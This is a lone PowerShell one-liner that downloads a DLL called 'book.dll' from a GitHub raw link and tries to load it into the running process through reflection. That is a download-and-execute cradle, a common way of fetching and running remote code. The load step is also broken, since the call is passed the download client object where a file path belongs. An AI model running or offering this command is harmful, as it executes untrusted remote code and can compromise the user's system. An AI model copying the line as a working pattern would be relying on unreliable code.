$down = New-Object System.Net.WebClient;$down.DownloadFile('https://github.com/tiptaptop/test/blob/master/book.dll?raw=true', 'book.dll'); [System.Reflection.Assembly]::LoadFile($down);



